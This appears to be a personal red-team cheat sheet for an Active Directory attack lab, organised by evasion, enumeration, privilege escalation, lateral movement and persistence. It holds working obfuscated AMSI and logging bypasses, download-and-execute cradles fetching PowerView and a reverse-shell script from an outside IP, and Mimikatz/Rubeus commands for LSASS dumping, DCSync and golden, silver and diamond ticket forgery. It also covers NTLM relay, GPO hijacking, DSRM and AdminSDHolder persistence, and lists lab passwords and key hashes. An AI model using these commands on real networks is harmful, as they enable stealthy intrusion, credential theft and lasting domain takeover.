<h1>Bypassing AV</h1>

<h3>!!! ALWAYS !!! ALWAYS !!! ALWAYS !!! TURN OFF AV AND DEFENDER FIRST THING FIRST</h3>

Tools: AMSITrigger, DefenderCheck, ByteToLineNumber, Codeception (source code obfuscation), ConfuserEx (binary obfuscation), Loader.exe 
1. Reverse strings (pg 23)
2. Remove unused detected scripts (pg 25)
3. Remove default comments
4. Rename the script and its functions
5. Rebuild DLL (pg 35)
6. Sandbox check (pg 37) 
7. Append obfuscated command and include function call (pg 39)
8. Source code obfuscation (pg 46) 
9. Compiled Binary obfuscation (pg 49) 
10. Payload delivery, Loader.exe (pg 54) --> mostly used 


<h1>Commonly Used Commands</h1>

<h2>EVASION</h2>

1. SBLoggingBypass
```
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

2. AMSIBypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

3. Magic Bypass
```
IEX (Get-Content -Path "C:\AD\Tools\hello.ps1" -Raw); IEX (Get-Content -Path "C:\AD\Tools\hello2.ps1" -Raw); IEX (Get-Content -Path "C:\AD\Tools\hello3.ps1" -Raw); MagicBypass;
```

<h2>LATERAL MOVEMENT</h2>

1. Port Forwarding
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.44 
```

2. Leveraging Port Forwarding
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

3. Copying Files
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
```

4. OPTH/PTH
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:xxx /aes256:xxx /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
```
c:\ad\tools\loader.exe -path c:\ad\tools\safetykatz.exe -args "sekurlsa::evasive-pth /user:xxx /aes256:xxx /domain:dollarcorp.moneycorp.local /run:cmd.exe" "exit"
```

5. Golden Ticket
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:{krbtgt hash} /sid:{Get-DomainSID} /ldap /user:{impersonated user} /printcmd
```
> Use the output to forge a ticket

6. Silver Ticket
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:{service name}/{computer name}.dollarcorp.moneycorp.local /rc4:{machine account hash} /sid:{Get-DomainSID} /ldap /user:{user to impersonate} /domain:dollarcorp.moneycorp.local /ptt
```
> when accessing the service, need to specify the FQDN 

7. Diamond Ticket
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:{krbtgt hash} /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<h1>Execution</h1>

1. Download execute cradle
*Download and execute code at a target system*
```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.44/PowerView.ps1'))
```
```
iex (iwr -usebasicparsing http://172.16.100.44/Invoke-PowerShellTcp.ps1)
```
2. Import ADModule
```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

<h1>Domain Enumeration</h1>

<h2>Tools</h2>

1. ADModule
2. BloodHound
3. PowerView
4. SharpView
5. PowerHuntShares
6. Invoke-SessionHunter

<h2>What To Enumerate</h2>

1. Current Domain, another domain supply -Domain parameter
```
Get-Domain
```
> Identify the domain's DC
2. All domains under the current forest
```
Get-ForestDomain
```
3. Domain's Trust (parent and external)
```
Get-DomainTrust
```
4. Domain SID
```
Get-DomainSID
```
> Will be used to forge tickets
5. Domain Controller
```
Get-DomainController -Domain xxx
```
6. Domain Users, Groups, Computers
```
Get-DomainUser, Get-DomainComputer, Get-DomainGroup
```
> user: select samaccountname, logoncount
> computers: select cn 
> Can search for specific attributes, substrings, recursive, 
7. Domain Admins, Enterprise Admins
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select membername
```
```
Get-DomainGroupMember -Domain "forest name" -Identity "Enterprise Admins" | select membername, membersid
```
8. Actively logged on users on a computer (pg 76) 
```
Get-NetLoggedon -ComputerName xxx
```
> We can know whose credentials we can extract if we can get into that computer
> Prerequisite: local admin rights on the target computer
9. Shares: using PowerHuntShares
```
Import-Module C:\AD\Tools\PowerHuntShares.psm1
```
```
Invoke-HuntSMBShares -noping -OutputDirectory c:\ad\tools -HostList servers.txt
```
> To be more OPSEC friendly, specify machines and exclude DC (pg 78)
> Copy and paste the HTML result to PC, show all the Share Graph
> What we can do with it: drop files into the shared folder, access the files in that shared folder 
10. BloodHound: map shortest path to DA, etc.. (pg 81, 83 for commands)
SharpHound command:
```
C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs
```
> Need to copy the entire Collectors folder

Copy to MacBook
```
scp -rp /Users/michellenovenda/Downloads/20250308212456_BloodHound.zip michellenovenda@192.168.64.4:/home/michellenovenda/Desktop
```
Analyze in Kali
```
neo4j start
```
> Navigate to the localhost
> Enter username neo4j and password 1qaz@WSX
> After connecting, use the connection credentials shown in the dashboard to login to the UI: bolt://localhost:7687
11. Interesting ACLs (other ACLs on pg 89)
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "username/groupname"} 
```
> What to look for: GenericAll or GenericWrite Permissions
> What we can do with it: Review ACL mindmap
> Analyze using BloodHound
```
Find-InterestingDomainACL | ?{$_.objectdn -match 'dcorp-mgmt'}
```
```
Get-RBCD-Threaded.exe -s -d dollarcorp.moneycorp.local 
```
> This is to search for GenericAll/GenericWrite on Computer Objects
> Configure RBCD on the computer we have write access on 
12. Domain OUs and its linked GPO
```
Get-NetOU, Get-DomainOU | select name, displayname, gplink
```
```
(Get-DomainOU -Identity 'OU Name').distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
> List all computers in an OU
```
Get-DomainGPO
```
```
Get-DomainGPO -Identity "{ gplink attribute from Get-NetOU }"
```
```
Get-DomainGPO -Identity (Get-DomainOU -Identity { OU Name }).gplink.substring(11,(Get-DomainOU -Identity { OU Name }).gplink.length-72)
```
> Shortcut: Find GPO name linked to OU 
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.objectdn -match "{ GPO ID }"}
```
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.objectdn -match "policies"}
```
Get a specific GPO Permission for a specific user 
```
Get-GPPermission -Guid 0BF8D01C-1F62-4BDC-958C-57140B67D147 -TargetType User -TargetName devopsadmin
```
> What to look for: Overly permissive GPO, those with WriteDACL, GenericWrite, GenericAll --> BloodHound 
> What we can do with it: GPOddity, modify gplink, add local admin, configure RBCD 
> If desperate, Find-InterestingDomainAcl for the GPO one by one :)
> Check 'Inbound Object Control' of the GPO in BloodHound
13. All machines where current user has local admin access
```
Find-LocalAdminAccess, Find-WMILocalAdminAccess, Find-PSRemotingLocalAdminAccess 
```
> What we can do with it: winrs, copy files, access resources, etc.. 
```
Get-DomainGpoLocalGroup
```
> Then run Get-DomainUser -Identity <GroupMembers SID>, can find a user which has local admin on the affected computers (need to find OU related to this GPO, then the computers under this OU) 
```
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-adminsrv
```
> Find users which are local admins on the computer (parameter) due to GPO Policy 
14. Find computers where DA has sessions (can specify other users using -UseGroupIdentity) 
```
Find-DomainUserLocation
```
> Prerequisite: Local admin privilege on the computer 
> What we can do: Know we have local admin privilege on that machine, can access and winrs to that computer, can extract DA credentials from that machine 
15. List sessions on remote machines
```
Invoke-SessionHunter
```
> OPSEC friendly: set -NoPortScan and -Targets 
> What to look for: find a computer where a DA has session 
> What we can do: target to access that machine and get DA credentials (escalate privileges) 
16. User accounts running services (user accounts treated as service account)
```
Get-DomainUser -SPN
```
> What we can do: kerberoasting, get the cleartext password and do winrs/runas
17. SPN of a specific computer (ADModule) 
```
get-adcomputer dcorp-mssql -properties serviceprincipalname | select-object -expandproperty serviceprincipalname
```
> Find out services we can access
18. User accounts that has Kerberos pre-auth disabled 
```
Get-DomainUser -PreauthNotRequired -Verbose
```
> What we can do: targeted kerberoasting 
19. Computers that have unconstrained delegation enabled 
```
Get-DomainComputer -UnConstrained
```
What we can do: 
* compromise the first hop which is the machine with unconstrained degelation enabled
* set up a listener (Rubeus monitor mode) 
* then trick a user (preferably DA) to connect to the first hop machine 
* steal their credentials 
20. Users and computers with constrained delegation
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth 
```
> What we can do with it: 
> 1. If I compromise the first hop user (first enumeration command), then I will be able to access the services listed on MsDS-AllowedToDelegateTo as any user including Domain Admin 
> 2. If we have GenericWrite/GenericAll on the first hop, we can modify the msDS-AllowedToDelegateTo to access any services (we modified) 
21. Computers that has RBCD configured
```
Get-DomainRBCD 
```
> What we can do with it: Access any services listed on SourceName using DelegatedName machine account credentials as any user including Domain Administrators
22. Certificates in the Target Environment 
```
C:\AD\Tools\Certify.exe cas
```
23. Enumerate Templates 
```
C:\AD\Tools\Certify.exe find 
```
> What to look for: 
> * Templates where we have enrollment rights (Permissions --> Enrollment Permissions --> Enrollment Rights) 
> * ENROLLEE_SUPPLIES_SUBJECT 
>   * What we can do: (plus requirement #1), enroll a certificate and supply subject for DA user 
> * Authorization Signatures Required = 0 
> * pkiextendedusage: Client Authentication --> access a resource, request a TGT 
24. Enumerate vulnerable templates
```
C:\AD\Tools\Certify.exe find /vulnerable
```
> * Not so detailed
> * Only show templates where a normal user has enrollment rights on the template 
25. Enumerate SQL Servers (PowerUpSQL)
```
Get-SQLInstanceDomain
```
> Ask DC to provide servers that have SPN beginning with MSSQL
> Look at the ComputerName and the Account used to run the service (DomainAccount) --> can be machine account thats running it 
26. Check if we have access to and are authorized to the SQL Server
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose 
```
27. Check the privileges
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose 
```
> AuthenticationMode : Windows and SQL Server Authentication
> * Means it accepts domain/Windows users to access the DB, and also supports SQL Server users  
> Check IsSysAdmin
> Domain users could have admin privileges on SQL Servers  
28. Enumerate SQL Server Links
```
Get-SQLServerLink -Instance <server name> -Verbose
```
> <server name> is from the previous commands, the one we have access to, dcorp-mssql in this case
> DatabaseLinkName --> the linked SQL Server 
> is_rpc_out_enabled : can we run commands on it
> is_data_access_enabled : can we access the data in the SQL server 
29. Crawl through the DB Server Link 
```
Get-SQLServerLinkCrawl -Instance <server name> -Verbose
```
> Server name should be the one we have access to
> Find the one where IsSysAdmin: 1
> Take note of the Link Login (DB Identities not domain identities) and Link Path To Server 
> In order to execute commands: 
> * either xp_cmdshell should already be enabled 
> * EXECUTE xp_cmdshell SQL command 
> Say we already have access to DCORP-MSSQL, we need to enable RPCOUT to EU-SQL1, and then enable xp_cmdshell on EU-SQL1, then use that to run commands 
30. Snaffler (Files and Shares)
```
.\Snaffler.exe -o snafflerout.txt -s -y
```
```
.\snafflerparser.ps1 -in snafflerout.txt -outformat all
```
<h1>Enumeration - BloodHound</h1>
    
1. Use my Kali Linux!
2. Run sudo command `neo4j start`
3. Navigate to the localhost
4. Enter username `neo4j` and password `1qaz@WSX`
5. After connecting, use the connection credentials shown in the dashboard to login to the UI: bolt://localhost:7687
    
<h1>Privilege Escalation - Local</h1>

<h2>Tools</h2>

1. PowerUp
2. Privesc
3. winPEAS

<h2>Prerequisites</h2>

1. Info about local admin access on target machines 
    > Find-DomainUserLocation
    > Invoke-SessionHunter + Get DomainAdmin Group Member

<h2>How to Escalate</h2>

1. Run checks --> escalate to local admin 
* PowerUp
```
Invoke-AllChecks | select servicename, check, abusefunction 
```
If can abuse service using Invoke-ServiceAbuse
```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -username dcorp\student844
```
Quick check: see if we are local admin on the machine
```
net localgroup administrators
```
* Privesc
```
Invoke-PrivEscCheck
```
* winPEAS
```
winPEASx64.exe
```
2. Abuse missing patches
3. Automated delopyment
    * Jenkins
    * Malicious lnk on AI share
4. AutoLogon passwords in clear text
    * can be used to run `runas`
5. AlwaysInstallElevated
6. Misconfigured Services
    * By running Invoke-AllChecks
7. DLL Hijacking
8. Kerberos
9. NTLM Relaying 
    * GPOddity 
        > Prerequisite: GPO with overly permissive ACL 

![image](https://hackmd.io/_uploads/HyPei1-2yg.png)
![image](https://hackmd.io/_uploads/BJObjJbnJg.png)

<h1>Privilege Escalation - GPO Abuse</h1>

<h2>Tools</h2>

1. PowerView
2. SharpGPOAbuse

<h2>Prerequisites</h2>

1. A process running with privilege to modify GPO
2. An overly permissive GPO

<h2>How to Escalate</h2>
    
1. Get GPO ID
```
get-gpo -name "DevOps Policy"
```
2. Fing interesting ACL on GPO. Found out devopsadmin has Write Permission on DevOps Policy that is applied to DevOps OU which has DCORP-CI
```
Get-GPPermission -Guid 0BF8D01C-1F62-4BDC-958C-57140B67D147 -TargetType User -TargetName devopsadmin
```
3. Create a Golden Ticket and inject to the process for devopsadmin privileges
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:devopsadmin /id:17101 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"12/17/2024 11:29:45 PM" /minpassage:1 /logoncount:869 /displayname:"devopsadmin" /netbios:dcorp /groups:513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```
4. Add student844 (or anyone, can also be other DOMAIN users) as a Local Admin on computers under DevOps OU
```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount dcorp\student844 --GPOName "DevOps Policy" --Force
```
5. Force GP Update, or wait for a few minutes 
```
gpupdate /force
```
6. On DCORP-CI, student844 is now a Local Admin 
```
net localgroup Administrators
```
![image](https://hackmd.io/_uploads/BJQkOwCiJl.png)
7. We can now access DCORP-CI as student844 
![image](https://hackmd.io/_uploads/H1YX_wAiJx.png)
    
<h1>Privilege Escalation - Relaying</h1>

<h2>Tools</h2>

1. Ubuntu WSL
2. ntlmrelayx.py

<h2>Prerequisites</h2>

1. A condition that allows NTLM Relaying to happen 
> In lab, devopsadmin executes any lnk file in shared AI folder
> We make it make it send an HTTP request to http://172.16.100.44 using the current user's (devopsadmin) credentials, and then relay it to LDAP server of DCORP-DC

<h2>How to Escalate</h2>

1. Capture command
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.44' -UseDefaultCredentials"
```
2. Relay command
```
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.44 --http-port '80,8080' -i --no-smb-server
```
3. It will then start an interactive Ldap shell via TCP on 127.0.0.1:11000 as DCORP/DEVOPSADMIN that we can connect to
```
nc 127.0.0.1 11000
```
4. We can then configure writedacl for student844 
```
write_gpo_dacl student844 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

<h2>What we can do with it</h2>

1. Use devopsadmin user privileges to access or modify objects
> * In this case, devopsadmin has privilege of WriteDACL on DevOps Policy
> * DevOps policy is linked to DevOps OU, which has DCORP-CI computer in it
> * We can provide any user a WriteDACL permission on DevOps Policy using devopsadmin privileges
> * Do this via the LDAP shell, make student844 has a write DACL permission on DevOps policy
> * When student844 gets it, modify the DevOps policy using student844 account
> * We modify it to add student844 as a local admin on the computers under the OU that is linked to DevOps Policy GPO
> * In this case, the computer is DCORP-CI

<h1>Privilege Escalation - GPOddity</h1>

<h2>Tools</h2>

1. gpoddity.py
2. write_gpo_dacl via LDAP shell, if need to provide a user a WriteDACL policy (user that we know the username and password, not hash)
3. Ubuntu 

<h2>Prerequisites</h2>

1. NTLM Relaying techniques (refer to section above) 
2. Credentials of a user who has WriteDACL on GPO (username & password)
3. GPO ID
4. Domain Controller IP
5. The command we want the computers under the linked OU to execute
6. The rogue IP and share that the GPO will point to

<h2>How to Escalate</h2>

1. Modify gpcfilesyspath via GPOddity as a user who has WriteDACL permission on the targeted GPO so it executes command in the rogue path
> In this case, the command is to make all computers under the GPO's linked OU to add student844 (attacker) as a local admin on that computer
```
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student844' --password 'WDyV3L6Sr3xPRgdp' --command 'net localgroup administrators student844 /add' --rogue-smbserver-ip '172.16.100.44' --rogue-smbserver-share 'std844-gp' --dc-ip '172.16.2.1' --smb-mode none
```
2. Copy the malicious GPO files to the rogue folder
3. Share the spoofed directory to everyone

<h2>What we can do with it</h2>

1. Make the computers under the OU that is linked to the GPO execute our malicious command. 
> Add attacker as local admin: `net localgroup administrators student844 /add`

<h1>Lateral Movement - PS Remoting</h1>

<h2>Tools</h2>

1. Enter-PSSession
```
Enter-PSSession -ComputerName <computer name>.<domain name> 
```
2. Invoke-Command (executes command parallely)
```
Invoke-Command -Scriptblock { <script> } -ComputerName (Get-Content <list_of_servers>)
```
3. winrs
```
winrs -r:<computername>.<domainname> cmd 
```
```
winrs -r:<computername>.<domainname> cmd /c <command>
```

<h2>Prerequisites</h2>

1. Local admin access on the target machine
2. The right ticket using the right credentials

<h2>Links</h2>

* https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_remote_troubleshooting?view=powershell-7.5
* https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_remote?view=powershell-7.5
* https://learn.microsoft.com/en-us/troubleshoot/windows-client/system-management-components/can-not-establish-ps-remote-session-winrm-aad-only-joined-machines

<h1>Lateral Movement - Credential Extraction</h1>

<h2>Tools</h2>

1. SafetyKatz (Mimikatz, Invoke-Mimi)
2. Impacket
3. DumpSAM 
    > https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1
4. Invoke-HiveDump
    > https://github.com/tmenochet/PowerDump/blob/master/HiveDump.ps1

<h2>Prerequisites</h2>

1. Knowledge on the user's session location (using Invoke-SessionHunter)
2. Access to the location
3. Foothold on the location 

<h2>Where To Look For Credentials</h2>

1. SAM hive (local credentials) --> DSRM password (lsadump::sam) 
2. LSA Secrets: sekurlsa::ekeys (lsadump::lsa)
3. DPAPI: vault credentials

<h2>How To Extract Credentials</h2>

1. ekeys: Credentials of users with sessions on the target computer
```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```
> extracts credentials from the memory of the LSASS process
> do this to extract credentials of users who has session on the current computer
> run this on any computers

2. All credentials from the domain (needs to be extracted from DC)
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```
> get the NTLM hash of all domain users from the DC
> run this on the DC

3. DCSync: get krbtgt credentials
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
> run this on any computers with DA privileges
> running on DC won't get detected by MDI

4. SAM Hive
```
c:\users\public\loader.exe -path http://127.0.0.1:8080/safetykatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```
> run this on the DC

5. Credential Vault
```
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```
> run this on any computers
6. Also run these fucking shits
```
C:\ad\tools\loader.exe -path c:\ad\tools\safetykatz.exe -args "sekurlsa::logonPasswords" "exit"
                                                        token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /user:domain\krbtgt /domain:lab.local
sekurlsa::logonpasswords
```

<h1>Lateral Movement - OverPass-The-Hash</h1>

<h2>Tools</h2>

1. Rubeus
2. SafetyKatz 

<h2>Prerequisites</h2>

1. Credentials of the target user 
2. Admin privilege (Run as administrator)
3. Credentials of machine account (TGS) --> for accessing specific services on specific computers 

<h2>What We Can Do With It</h2>

1. OPTH gives you access to whatever the account have access to.
2. Asktgs is not a necessary step to conduct since window will automatically request a TGS using your valid TGT. 

<h2>How to OPTH</h2>

1. Rubeus
```
c:\ad\tools\loader.exe -path c:\ad\tools\rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
```
2. SafetyKatz
```
c:\ad\tools\loader.exe -path c:\ad\tools\safetykatz.exe -args "sekurlsa::evasive-pth /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /domain:dollarcorp.moneycorp.local /run:cmd.exe" "exit"
```

<h1>Lateral Movement - DCSync</h1>

<h2>Tools</h2>

1. SafetyKatz
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

<h2>Prerequisites</h2>

1. DA credentials
2. A process running as DA, EA, or DC privileges
3. DCSync rights (can be added under process with DA privilege using Add-DomainObjectAcl) --> Learning Objective 12
    > Replicating directory changes & Replicating directory changes all
4. DC machine account + its SPN for LDAP --> Learning Objective 15

<h2>What We Can Do With It</h2>

1. Get krbtgt credentials --> Create golden/diamond tickets as Administrator (or any user) to access any resources in the domain 

<h2>How to DCSync</h2>

1. Get krbtgt hash (execute in process with DA privilege)
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
2. Add DCSync Rights to a user (need to run process as DA)
```
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student844 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
3. Check if a user has DCSync Rights (PowerShell) 
```
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student844"}
```

<h1>Persistence - Golden Ticket</h1>

<h2>Tools</h2>

1. SafetyKatz

<h2>Prerequisites</h2>

1. krbtgt hash (need DA privilege to get this from DC) 
2. Domain SID

<h2>What We Can Do With It</h2>

1. Access any services on any computers as a DA 

<h2>How to Persist</h2>

1. Use the krbtgt hash to impersonate any user in the domain
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:{krbtgt hash} /sid:{Get-DomainSID} /ldap /user:{impersonated user} /printcmd
```
> Use the output to forge a ticket

<h1>Persistence - Silver Ticket</h1>

<h2>Tools</h2>

1. SafetyKatz

<h2>Prerequisites</h2>

1. User or Service account hash running the targeted service, NOT MACHINE ACCOUNT
    > RC4 is ok
    > Find a user account that acts as a service account (has SPN configured)
    > Get-DomainUser -spn
2. Domain SID
3. Admin process

<h2>Notes</h2>

1. By default, the machine account does not have local admin access to the machine. 
2. The hash should be from an account that has local admin access to a computer and has SPN configured
3. Impersonated user must have local admin access on that machine 
4. A specified logon session does not exist. It may
already have been terminated. might not necessarily mean you are providing the wrong credentials. 
    > Used same `DCORP-DC$` NTLM hash for HTTP on DCORP-DC, svcadmin works but Administrator do not work 
    > Specify <domain> \ <username> for user impersonation

<h2>How to Persist</h2>

1. Use the service account hash to access a resource in the domain
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:{service name}/{computer name}.dollarcorp.moneycorp.local /rc4:{service account hash} /sid:{Get-DomainSID} /ldap /user:{user to impersonate} /domain:dollarcorp.moneycorp.local /ptt
```
> When accessing the service, need to specify the FQDN 
> To access the service, the user we impersonate must have permission to access that service 

<h1>Persistence - Diamond Ticket</h1>

<h2>Tools</h2>

1. SafetyKatz

<h2>Prerequisites</h2>

1. krbtgt account hash 
2. Domain SID
3. Admin process

<h2>What We Can Do With It</h2>

1. Access any services on any computers as a DA 

<h2>How to Persist</h2>

1. Use the krbtgt account hash to forge a diamond ticket
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:{krbtgt hash} /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<h1>Persistence - Skeleton Key (Not Recommended)</h1>

<h2>Tools</h2>

1. Loader
2. SafetyKatz

<h2>Prerequisites</h2>

1. DA privileges

<h2>How to Persist</h2>

1. Run the following command
```
c:\users\public\loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "privilege::debug misc::skeleton -ComputerName dcorp-dc.dollarcorp.moneycorp.local" "exit"
```
> Got: ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

2. Run the next command to enter DCORP-DC with password: mimikatz
```
enter-pssession -computername dcorp-dc -credential dcorp\Administrator
```
> Rejected: Connecting to remote server dcorp-dc failed with the following error message : The user name or password is incorrect. 

<h1>Persistence - DSRM</h1>

<h2>Tools</h2>

1. SafetyKatz

<h2>Prerequisites</h2>

1. DA privileges
2. DSRM Administrator password (different from Domain Administrator) 

<h2>How to Escalate</h2>

1. Get the DSRM Administrator hash (different from DA) --> run the command in DC
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```
> extract credentials from SAM Hive (local credentials)
> target: Administrator NTLM Hash 

2. Alter the logon behavior while in DC
```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```
3. PTH: Access DC using DSRM Administrator account
```
c:\ad\tools\loader.exe -path c:\ad\tools\safetykatz.exe -args "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:{ DSRM Admin NTLM Hash } /run:cmd.exe" "exit"
```
> We use PTH: the domain is not domain name but the DC 
4. Set DC as trusted host in PowerShell
```
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```
5. Access DC using DSRM Administrator account via PowerShell Remoting
```
Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential 
```
> We are using NTLM to start powershell process 
> we need to trust the DC 
> using NTLM and IP, the target host must be in the list of the Trusted Hosts 
    
<h1>Persistence - Using ACLs: AdminSDHolder</h1>

<h2>Tools</h2>

1. Invoke-SDPropagator --> manually trigger propagation
> Overwriting SDProp to the ACLs of protected groups (including Domain Admins group) 
2. PowerView --> change the SDProp
3. RACE toolkit --> change the SDProp 

<h2>Prerequisites</h2>

1. DA privileges

<h2>What We Can Do With It</h2>
    
1. Get Full Control (GenericAll) rights on protected groups' ACL
2. We can use that to add ourselves into the Domain Admins group
3. And we can access domain computers using username and password of a user we control 

<h2>How to Abuse</h2>
    
1. Check permissions, or run a check to see if propagation works properly 
```
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student844"}
```
2. Add FullControl permission for a user to the AdminSDHolder (run on a process with DA privilege, does not have to be from DCORP-DC)
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student844 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
> -TargetIdentity: Get-DomainObject -Identity 'adminsdholder' (Get the distinguished name) 
